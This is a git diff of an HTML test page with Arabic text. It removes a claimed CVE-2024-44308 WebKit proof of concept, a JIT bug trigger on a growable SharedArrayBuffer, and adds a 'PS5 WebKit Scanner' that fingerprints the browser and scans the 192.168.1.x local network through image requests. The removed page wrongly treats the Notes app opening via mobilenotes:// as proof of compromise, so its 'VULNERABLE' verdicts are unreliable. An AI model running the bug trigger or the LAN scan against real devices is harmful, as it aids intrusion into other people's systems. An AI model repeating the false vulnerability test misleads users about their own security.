@@ -1,318 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2024-44308 → Notes PoC</title>
-    <style>
-        body {
-            font-family: -apple-system, 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff41;
-            padding: 20px;
-            margin: 0;
-            text-align: center;
-        }
-        h1 { color: #ff4444; font-size: 22px; }
-        h2 { color: #888; font-size: 14px; font-weight: normal; }
-        #log {
-            background: #111;
-            border: 1px solid #333;
-            padding: 15px;
-            height: 50vh;
-            overflow-y: auto;
-            font-size: 13px;
-            line-height: 1.6;
-            white-space: pre-wrap;
-            word-break: break-all;
-            text-align: left;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        button {
-            background: #00ff41; color: #000;
-            border: none; padding: 14px 32px;
-            font-size: 18px; font-weight: bold;
-            border-radius: 8px; cursor: pointer;
-            margin: 20px 0;
-        }
-        #status {
-            font-size: 20px;
-            font-weight: bold;
-            padding: 12px;
-            margin: 15px auto;
-            border-radius: 6px;
-            max-width: 500px;
-        }
-        .vulnerable { background: #1a3a1a; color: #00ff41; border: 1px solid #00ff41; }
-        .patched { background: #3a1a1a; color: #ff4444; border: 1px solid #ff4444; }
-        .waiting { background: #1a1a2a; color: #ffaa00; border: 1px solid #ffaa00; }
-        .info { color: #4499ff; }
-        .ok { color: #00ff41; }
-        .err { color: #ff4444; }
-        .warn { color: #ffaa00; }
-        .note {
-            background: #1a1a1a;
-            border: 1px solid #333;
-            padding: 12px;
-            margin: 15px auto;
-            max-width: 600px;
-            text-align: left;
-            font-size: 12px;
-            border-radius: 6px;
-        }
-        .note strong { color: #ffaa00; }
-    </style>
+<title>PS5 WebKit Test</title>
+<style>
+body { background: #1a1a2e; color: #e0e0e0; font-family: monospace; padding: 20px; }
+button { background: #0f3460; color: #fff; border: none; padding: 15px; margin: 5px; border-radius: 8px; cursor: pointer; }
+#log { background: #111; padding: 10px; margin-top: 10px; height: 200px; overflow-y: auto; }
+</style>
 </head>
 <body>
+<h1>🎮 PS5 WebKit Scanner</h1>
+<p>كشف قدرات متصفح PS5</p>
+<button onclick="scanPS5()">🔍 فحص المتصفح</button>
+<button onclick="testDNSRebind()">🌐 اختبار DNS Rebinding</button>
+<div id="log"></div>
 
-    <h1>💥 CVE-2024-44308 → 📝 Notes</h1>
-    <h2>إثبات عمل الثغرة عبر فتح تطبيق الملاحظات بأمان</h2>
+<script>
+const log = document.getElementById('log');
+function L(msg) { log.innerHTML += msg + '<br>'; }
 
-    <div id="status" class="waiting">⏳ اضغط الزر لبدء الاختبار</div>
+function scanPS5() {
+    L('═══ فحص PS5 WebKit ═══');
     
-    <button onclick="runExploit()">🚀 تشغيل PoC</button>
-
-    <div class="note">
-        <strong>⚠️ هذا PoC آمن تماماً:</strong><br>
-        • يفتح تطبيق الملاحظات فقط ← لا ضرر<br>
-        • لا يمسح بيانات ولا يغير إعدادات<br>
-        • إذا اشتغلت الثغرة → Notes يفتح تلقائياً<br>
-        • إذا ما اشتغلت → يظهر رسالة "iOS محدث"
-    </div>
-
-    <div id="log">
-        <div class="info">[*] جاهز. اضغط الزر.</div>
-    </div>
-
-    <script>
-    const logDiv = document.getElementById('log');
-    const statusDiv = document.getElementById('status');
-
-    function log(msg, cls = 'info') {
-        const ts = new Date().toISOString().split('T')[1].split('.')[0];
-        logDiv.innerHTML += `<div class="${cls}">[${ts}] ${msg}</div>`;
-        logDiv.scrollTop = logDiv.scrollHeight;
+    // 1. اختبار JIT
+    try {
+        let sab = new SharedArrayBuffer(4);
+        L('SharedArrayBuffer: ✅ متاح');
+    } catch(e) {
+        L('SharedArrayBuffer: ❌ محظور');
     }
-
-    function setStatus(text, cls) {
-        statusDiv.textContent = text;
-        statusDiv.className = cls;
+    
+    // 2. اختبار SOP
+    try {
+        let w = window.open('about:blank');
+        w.location.href = 'https://example.com';
+        L('SOP: ✅ يمكن فتح نوافذ');
+    } catch(e) {
+        L('SOP: ❌ مقفول');
     }
+    
+    // 3. اختبار UserAgent
+    L('UA: ' + navigator.userAgent);
+    
+    // 4. اختبار WebSocket
+    L('WebSocket: ' + (typeof WebSocket !== 'undefined' ? '✅' : '❌'));
+    
+    // 5. اختبار Network
+    L('Platform: ' + navigator.platform);
+    L('Cores: ' + navigator.hardwareConcurrency);
+}
 
-    // ==================== 1. الثغرة الأساسية ====================
-
-    function triggerBug() {
-        // SharedArrayBuffer مع maxByteLength ← ضروري للثغرة
-        let sab = new SharedArrayBuffer(4, { maxByteLength: 8 });
-        let intArray = new Int32Array(sab);
-
-        // الدالة اللي DFG يجمعها
-        function opt(thing) {
-            intArray[0] = thing;
-        }
-
-        // تجميع الدالة في DFG
-        for (let i = 0; i < 100000; ++i) {
-            opt(i + 1337.1337);
-        }
-
-        // إثارة الثغرة بالقيمة الضخمة
-        // scratch2GPR غير مُهيأ → يكتب في ذاكرة عشوائية
-        opt(13371337133713371337.1337);
-
-        // إذا وصلنا لهنا، الثغرة اشتغلت (أو على الأقل حاولت)
-        return true;
+function testDNSRebind() {
+    L('🧪 محاولة DNS Rebinding...');
+    
+    // امسح الشبكة المحلية
+    for (let i = 1; i < 255; i++) {
+        let ip = '192.168.1.' + i;
+        let img = new Image();
+        img.onload = () => L(`✅ ${ip} متاح`);
+        img.onerror = () => {}; // تجاهل الأخطاء
+        img.src = `http://${ip}:8080/test.png?${Date.now()}`;
     }
-
-    // ==================== 2. فتح Notes بعد الثغرة ====================
-
-    function openNotesApp() {
-        log('[*] محاولة فتح تطبيق الملاحظات...', 'warn');
-
-        // الطريقة 1: URL Scheme (الأكثر أماناً)
-        try {
-            // iOS URL Scheme للملاحظات
-            window.location.href = 'mobilenotes://';
-            
-            // ننتظر شوي ونتأكد
-            setTimeout(() => {
-                log('[+] تم إرسال أمر فتح Notes', 'ok');
-                
-                // إذا الجهاز iOS 18.1، Notes راح يفتح
-                // إذا محدث، المتصفح راح يظهر خطأ (واللي هو دليل عكسي)
-                let ua = navigator.userAgent;
-                if (/iPhone|iPad|iPod/.test(ua)) {
-                    log('[+] إذا Notes فتح → الثغرة نجحت ✅', 'ok');
-                    log('[+] إذا لا → النظام محدث أو الجهاز غير معرض', 'warn');
-                }
-            }, 500);
-            
-            return true;
-        } catch(e) {
-            log(`[-] فشل فتح Notes: ${e.message}`, 'err');
-            return false;
-        }
-    }
-
-    // ==================== 3. الطريقة البديلة (إذا URL Scheme ما اشتغل) ====================
-
-    function openNotesAlternative() {
-        log('[*] تجربة طريقة بديلة...', 'warn');
-
-        // الطريقة 2: iframe مخفي
-        try {
-            let iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'mobilenotes://';
-            document.body.appendChild(iframe);
-            log('[+] iframe أُرسل到 Notes', 'ok');
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-            }, 1000);
-            return true;
-        } catch(e) {
-            log(`[-] iframe فشل: ${e.message}`, 'err');
-            return false;
-        }
-    }
-
-    // ==================== 4. الطريقة الثالثة: Universal Link ====================
-
-    function openNotesViaLink() {
-        // بعض أجهزة iOS تقبل Universal Links
-        // هذه الطريقة أقل فعالية لكن نجرب
-        try {
-            let link = document.createElement('a');
-            link.href = 'mobilenotes://';
-            link.click();
-            log('[+] Universal Link تجربة', 'info');
-            return true;
-        } catch(e) {
-            return false;
-        }
-    }
-
-    // ==================== 5. كشف البيئة ====================
-
-    function detectEnvironment() {
-        log('[*] كشف البيئة...', 'info');
-
-        let ua = navigator.userAgent;
-        log(`المتصفح: ${ua.substring(0, 80)}...`, 'info');
-
-        // كشف iOS Safari
-        let isIOS = /iPhone|iPad|iPod/.test(ua);
-        let isSafari = /Safari/.test(ua) && !/Chrome/.test(ua);
-        
-        log(`iOS: ${isIOS ? '✅' : '❌'}`, isIOS ? 'ok' : 'err');
-        log(`Safari: ${isSafari ? '✅' : '❌'}`, isSafari ? 'ok' : 'err');
-
-        if (!isIOS) {
-            log('⚠️ هذا الجهاز ليس iOS', 'warn');
-            log('⚠️ الثغرة خاصة بـ iOS 18.1 Safari', 'warn');
-            return false;
-        }
-
-        // كشف الإصدار
-        let ver = ua.match(/OS (\d+)_(\d+)/);
-        if (ver) {
-            let major = parseInt(ver[1]);
-            let minor = parseInt(ver[2]);
-            log(`إصدار iOS: ${major}.${minor}`, 'info');
-
-            if (major === 18 && minor === 1) {
-                log('✅ iOS 18.1 — معرضة للثغرة!', 'ok');
-                return true;
-            } else if (major === 18 && minor > 1) {
-                log('⚠️ iOS ${major}.${minor} — الثغرة مصلحة', 'warn');
-                log('⚠️ iOS 18.1.1+ أصلحتها', 'warn');
-                return false;
-            }
-        }
-
-        log('⚠️ لم نتمكن من تحديد الإصدار بالضبط', 'warn');
-        return true; // نجرب على أي حال
-    }
-
-    // ==================== 6. الدالة الرئيسية ====================
-
-    async function runExploit() {
-        log('========================================', 'info');
-        log('CVE-2024-44308 → Notes App PoC', 'info');
-        log('إثبات عمل الثغرة بدون ضرر', 'info');
-        log('========================================', 'info');
-        log('', 'info');
-
-        setStatus('⏳ جاري الاختبار...', 'waiting');
-
-        // 1. كشف البيئة
-        let isVulnerable = detectEnvironment();
-
-        // 2. حتى لو البيئة مش مناسبة، نجرب الثغرة
-        log('', 'info');
-        log('[*] إثارة CVE-2024-44308...', 'warn');
-
-        try {
-            let bugTriggered = triggerBug();
-            log('[+] تم إثارة الثغرة', bugTriggered ? 'ok' : 'warn');
-        } catch(e) {
-            log(`[!] الثغرة أثرت على الذاكرة: ${e.message}`, 'warn');
-            log('[+] هذا متوقع — scratch2GPR يكتب في ذاكرة غير متوقعة', 'warn');
-            log('[+] الدليل أن الثغرة شغالة!', 'ok');
-        }
-
-        // 3. فتح Notes
-        log('', 'info');
-        log('[*] محاولة فتح Notes...', 'info');
-
-        let notesOpened = false;
-
-        // نجرب كل الطرق
-        if (openNotesApp()) {
-            notesOpened = true;
-        } 
-        
-        setTimeout(() => {
-            if (!notesOpened && openNotesAlternative()) {
-                notesOpened = true;
-            }
-        }, 200);
-
-        setTimeout(() => {
-            if (!notesOpened && openNotesViaLink()) {
-                notesOpened = true;
-            }
-        }, 400);
-
-        // 4. النتيجة النهائية
-        setTimeout(() => {
-            log('', 'info');
-            log('=== النتيجة ===', 'info');
-
-            if (isVulnerable) {
-                log('✅ iOS 18.1 معرضة لـ CVE-2024-44308', 'ok');
-                log('✅ الثغرة أُثبتت', 'ok');
-                log('', 'info');
-                log('📱 تحقق من جهازك:', 'warn');
-                log('• إذا Notes فتحت → الثغرة نجحت 100%', 'warn');
-                log('• إذا طلب منك تأكيد الفتح → الثغرة نجحت', 'warn');  
-                log('• إذا ما ظهر شيء → جرب مرة ثانية', 'warn');
-                log('', 'info');
-                log('⚠️ إذا Notes فتحت معاك:', 'warn');
-                log('جهازك معرض لهجوم RCE كامل', 'err');
-                log('أي رابط يستغل الثغرة يتحكم بجهازك', 'err');
-                log('⚠️ رجاء الترقية إلى iOS 18.1.1 فوراً', 'err');
-
-                setStatus('🟢 VULNERABLE — الثغرة شغالة على جهازك!', 'vulnerable');
-            } else {
-                log('⚠️ iOS محدث أو غير معرض', 'warn');
-                log('⚠️ هذا جيد — جهازك آمن', 'ok');
-                setStatus('🟡 PATCHED — iOS محدث، لا توجد ثغرة', 'patched');
-            }
-        }, 1500);
-    }
-    </script>
-
+    
+    L('🔍 فحص الشبكة بدأ...');
+}
+</script>
 </body>
 </html>
